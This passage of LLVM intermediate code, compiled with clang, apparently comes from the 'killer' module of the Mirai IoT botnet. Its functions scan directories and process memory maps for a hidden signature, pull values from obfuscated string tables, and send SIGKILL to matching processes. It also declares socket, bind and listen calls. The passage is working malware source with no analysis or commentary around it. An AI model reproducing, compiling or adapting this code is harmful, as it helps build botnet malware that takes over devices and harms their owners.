  %356 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %357 = call i32 @util_stristr(i8* %353, i32 %355, i8* %356)
  %358 = icmp ne i32 %357, -1
  br i1 %358, label %359, label %363

359:                                              ; preds = %352
  %360 = load i8*, i8** %22, align 8
  %361 = call i32 @util_atoi(i8* %360, i32 10)
  %362 = call i32 @kill(i32 %361, i32 9) #5
  store i32 1, i32* %15, align 4
  br label %363

363:                                              ; preds = %359, %352
  br label %303, !llvm.loop !14

364:                                              ; preds = %310
  %365 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %366 = call i32 @closedir(%struct.__dirstream* %365)
  br label %367

367:                                              ; preds = %364, %281
  br label %235, !llvm.loop !13

368:                                              ; preds = %242
  %369 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %370 = call i32 @closedir(%struct.__dirstream* %369)
  br label %371

371:                                              ; preds = %368, %230
  %372 = call i32 @sleep(i32 1)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  call void @table_lock_val(i8 zeroext 8)
  call void @table_lock_val(i8 zeroext 9)
  %373 = load i32, i32* %15, align 4
  %374 = trunc i32 %373 to i8
  store i8 %374, i8* %2, align 1
  br label %375

375:                                              ; preds = %371, %229, %52
  %376 = load i8, i8* %2, align 1
  ret i8 %376
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #1

declare void @table_unlock_val(i8 zeroext) #3

declare %struct.__dirstream* @opendir(i8*) #3

declare i8* @table_retrieve_val(i32, i32*) #3

declare void @table_lock_val(i8 zeroext) #3

declare %struct.dirent* @readdir(%struct.__dirstream*) #3

declare i32 @util_atoi(i8*, i32) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @maps_scan_match(i8* %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i8*, align 8
  %4 = alloca [512 x i8], align 16
  %5 = alloca i8, align 1
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8 0, i8* %5, align 1
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = call i32 (i8*, i32, ...) @open(i8* %8, i32 0)
  store i32 %9, i32* %6, align 4
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i8 0, i8* %2, align 1
  br label %33

12:                                               ; preds = %1
  call void @table_unlock_val(i8 zeroext 62)
  br label %13

13:                                               ; preds = %28, %12
  %14 = load i32, i32* %6, align 4
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %4, i64 0, i64 0
  %16 = call i64 @read(i32 %14, i8* %15, i64 512)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %7, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %29

19:                                               ; preds = %13
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %4, i64 0, i64 0
  %21 = load i32, i32* %7, align 4
  %22 = call i8* @table_retrieve_val(i32 62, i32* null)
  %23 = call i8* @table_retrieve_val(i32 62, i32* null)
  %24 = call i32 @util_strlen(i8* %23)
  %25 = call signext i8 @mem_exists(i8* %20, i32 %21, i8* %22, i32 %24)
  %26 = icmp ne i8 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %19
  store i8 1, i8* %5, align 1
  br label %29

28:                                               ; preds = %19
  br label %13, !llvm.loop !15

29:                                               ; preds = %27, %13
  call void @table_lock_val(i8 zeroext 62)
  %30 = load i32, i32* %6, align 4
  %31 = call i32 @close(i32 %30)
  %32 = load i8, i8* %5, align 1
  store i8 %32, i8* %2, align 1
  br label %33

33:                                               ; preds = %29, %11
  %34 = load i8, i8* %2, align 1
  ret i8 %34
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @util_zero(i8*, i32) #3

declare i32 @closedir(%struct.__dirstream*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_kill() #0 {
  %1 = load i32, i32* @killer_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #5
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

declare i8* @util_itoa(i32, i32, i8*) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #2

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i8* @util_fdgets(i8*, i32, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i64 @readlink(i8*, i8*, i64) #1

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @mem_exists(i8* %0, i32 %1, i8* %2, i32 %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %9, align 4
  %12 = load i32, i32* %7, align 4
  %13 = icmp sgt i32 %11, %12
  br i1 %13, label %14, label %15

14:                                               ; preds = %4
  store i8 0, i8* %5, align 1
  br label %42

15:                                               ; preds = %4
  br label %16

16:                                               ; preds = %40, %15
  %17 = load i32, i32* %7, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %7, align 4
  %19 = icmp ne i32 %17, 0
  br i1 %19, label %20, label %41

20:                                               ; preds = %16
  %21 = load i8*, i8** %6, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %6, align 8
  %23 = load i8, i8* %21, align 1
  %24 = sext i8 %23 to i32
  %25 = load i8*, i8** %8, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %24, %30
  br i1 %31, label %32, label %39

32:                                               ; preds = %20
  %33 = load i32, i32* %10, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %10, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %34, %35
  br i1 %36, label %37, label %38

37:                                               ; preds = %32
  store i8 1, i8* %5, align 1
  br label %42

38:                                               ; preds = %32
  br label %40

39:                                               ; preds = %20
  store i32 0, i32* %10, align 4
  br label %40

40:                                               ; preds = %39, %38
  br label %16, !llvm.loop !16

41:                                               ; preds = %16
  store i8 0, i8* %5, align 1
  br label %42

42:                                               ; preds = %41, %37, %14
  %43 = load i8, i8* %5, align 1
  ret i8 %43
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
